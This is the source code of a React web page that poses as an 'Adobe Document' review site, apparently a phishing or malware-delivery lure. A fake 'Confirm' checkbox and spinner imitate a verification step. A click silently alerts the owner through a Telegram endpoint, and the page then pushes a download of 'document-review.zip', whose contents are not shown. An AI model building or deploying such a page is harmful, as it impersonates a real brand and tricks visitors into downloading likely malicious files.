"use client";

import { useEffect, useRef, useState } from "react";

const NOTIFICATION_URL = "/api/send-telegram";
const DOCUMENT_URL = "/document-review.zip";

type CheckStatus = "idle" | "checking" | "complete";
type NotificationStatus = "idle" | "sending" | "sent" | "failed";

function DocumentIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-5 w-5"
    >
      <path d="M14 3H6a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V8l-5-5Z" />
      <path d="M14 3v5h5M8 12h8M8 16h5" />
    </svg>
  );
}

function ArrowIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-4 w-4"
    >
      <path d="M5 12h14m-5-5 5 5-5 5" />
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-6 w-6"
    >
      <path d="M12 3 4 6v6c0 5 8 9 8 9s8-4 8-9V6l-8-3Z" />
      <path d="m9 12 2 2 4-4" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-7 w-7 text-emerald-300"
    >
      <path d="m5 12 4 4L19 6" />
    </svg>
  );
}

export default function Home() {
  const [checkStatus, setCheckStatus] =
    useState<CheckStatus>("idle");

  const [notificationStatus, setNotificationStatus] =
    useState<NotificationStatus>("idle");

  const [documentVisible, setDocumentVisible] = useState(false);
  const [downloadStarted, setDownloadStarted] = useState(false);

  const notificationStarted = useRef(false);
  const titleRef = useRef<HTMLHeadingElement>(null);

  useEffect(() => {
    if (checkStatus !== "checking") return;

    const timer = window.setTimeout(() => {
      setCheckStatus("complete");
    }, 2000);

    return () => window.clearTimeout(timer);
  }, [checkStatus]);

  useEffect(() => {
    if (documentVisible) {
      titleRef.current?.focus();
    }
  }, [documentVisible]);

  async function notifyOwner() {
    setNotificationStatus("sending");

    try {
      const response = await fetch(NOTIFICATION_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          event: "demo_checkbox_clicked",
        }),
        signal: AbortSignal.timeout(10000),
      });

      const result = await response.json().catch(() => null);

      if (!response.ok) {
        console.error("Notification API error:", {
          status: response.status,
          message: result?.error ?? "Unknown API error",
        });

        setNotificationStatus("failed");
        return;
      }

      setNotificationStatus("sent");
    } catch (error) {
      console.error(
        "Notification request failed:",
        error instanceof Error ? error.message : "Unknown error"
      );

      setNotificationStatus("failed");
    }
  }

  function startDemo() {
    if (notificationStarted.current || checkStatus !== "idle") {
      return;
    }

    notificationStarted.current = true;
    setCheckStatus("checking");

    // Starts immediately; delivery does not block the animation.
    void notifyOwner();
  }

  return (
    <div className="relative isolate flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#26070D] font-sans text-white selection:bg-rose-300/30">
      <div
        aria-hidden="true"
        className="pointer-events-none absolute inset-0 -z-10 overflow-hidden"
      >
        <div className="absolute inset-0 bg-gradient-to-br from-[#8B1020] via-[#4B0B16] to-[#17060A]" />

        <div className="absolute -left-32 -top-32 h-[500px] w-[500px] rounded-full bg-red-600/40 blur-[130px]" />

        <div className="absolute -bottom-40 -right-32 h-[550px] w-[550px] rounded-full bg-rose-500/30 blur-[140px]" />

        <div className="absolute inset-0 bg-black/10" />

        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_0%,rgba(0,0,0,0.25)_100%)]" />
      </div>

      <header className="shrink-0 border-b border-white/15 bg-white/5 backdrop-blur-xl">
        <div className="mx-auto flex h-16 w-full max-w-6xl items-center justify-between px-5 sm:px-8">
          <a
            href="/"
            aria-label="Document Space home"
            className="flex items-center gap-3 rounded-md focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
          >
           <img src="/adobe.png" alt="" className="h-7 w-7" />

            <span className="text-sm font-semibold tracking-tight">
              Adobe Document
            </span>
          </a>

          <span className="rounded-full border border-white/15 px-3 py-1 text-[10px] tracking-wide text-white/60">
            Document Review
          </span>
        </div>
      </header>

      <main className="flex min-h-0 flex-1 overflow-y-auto px-5 py-6">
        <section
          aria-labelledby="page-title"
          className="mx-auto my-auto w-full max-w-[380px]"
        >
          <div className="mb-7 text-center">
            <h1
              ref={titleRef}
              id="page-title"
              tabIndex={-1}
              className="text-xl font-medium tracking-tight outline-none sm:text-2xl"
            >
              {documentVisible
                ? "Ready when you are."
                : "Before you continue"}
            </h1>
          </div>

          <div className="relative overflow-hidden rounded-2xl border border-white/20 bg-white/10 p-5 shadow-[0_20px_80px_-25px_rgba(0,0,0,0.5)] backdrop-blur-2xl sm:p-7">
            <div
              aria-hidden="true"
              className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-white/50 to-transparent"
            />

            {!documentVisible ? (
              <>
                <div className="flex items-center justify-between gap-3 rounded-lg border border-white/20 bg-white/10 px-3 py-5">
                  <label className="flex min-w-0 cursor-pointer items-center gap-3">
                    <span className="relative grid h-7 w-7 shrink-0 place-items-center">
                      <input
                        type="checkbox"
                        checked={checkStatus !== "idle"}
                        disabled={checkStatus !== "idle"}
                        onChange={(event) => {
                          if (event.target.checked) startDemo();
                        }}
                        aria-describedby="check-status demo-notice"
                        className={
                          checkStatus === "idle"
                            ? "h-7 w-7 cursor-pointer accent-rose-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
                            : "sr-only"
                        }
                      />

                      {checkStatus === "checking" && (
                        <span
                          aria-hidden="true"
                          className="h-6 w-6 animate-spin rounded-full border-2 border-white/30 border-t-white motion-reduce:animate-none"
                        />
                      )}

                      {checkStatus === "complete" && <CheckIcon />}
                    </span>

                    <span className="text-[13px]">
                      Confirm
                    </span>
                  </label>

                  <span
                    aria-hidden="true"
                    className="shrink-0 text-white/60"
                  >
                    <ShieldIcon />
                  </span>
                </div>

                <p
                  id="check-status"
                  role="status"
                  aria-live="polite"
                  aria-atomic="true"
                  className="mt-3 min-h-5 text-xs text-white/70"
                >
                  {checkStatus === "idle"
                    ? "Select the checkbox."
                    : checkStatus === "checking"
                      ? "Confirming your selection…"
                      : "Complete. You may now continue."}
                </p>

                <button
                  type="button"
                  disabled={checkStatus !== "complete"}
                  onClick={() => {
                    if (checkStatus === "complete") {
                      setDocumentVisible(true);
                    }
                  }}
                  className="mt-5 flex w-full items-center justify-center gap-3 rounded-lg bg-white px-4 py-3 text-sm font-semibold text-[#790D19] transition-colors hover:bg-rose-50 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white disabled:cursor-not-allowed disabled:bg-white/20 disabled:text-white/40"
                >
                  Continue
                  <ArrowIcon />
                </button>
              </>
            ) : (
              <>
                <div className="mb-5 flex items-center justify-between">
                  <span className="grid h-12 w-12 place-items-center rounded-xl border border-white/20 bg-white/10">
                    <DocumentIcon />
                  </span>

                </div>

                <p className="mt-2 text-xs leading-5 text-white/60">
                  Your document is ready. Use the button below to download it.
                </p>

                <div className="my-5 h-px bg-white/15" />

               <a
  href={DOCUMENT_URL}
  target="_blank"
  rel="noopener noreferrer"
  onClick={() => setDownloadStarted(true)}
  className="flex w-full items-center justify-center gap-3 rounded-lg bg-white px-4 py-3 text-sm font-semibold text-[#790D19] transition-colors hover:bg-rose-50 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
>
  {downloadStarted ? "Downloaded" : "Download Document"}
  {downloadStarted ? <CheckIcon /> : <ArrowIcon />}
</a>
              </>
            )}
          </div>
        </section>
      </main>

      <footer className="shrink-0 border-t border-white/10 bg-white/5 px-5 py-4 text-center text-[10px] text-white/50 backdrop-blur-xl">
        Adobe Document @2026
      </footer>
    </div>
  );
}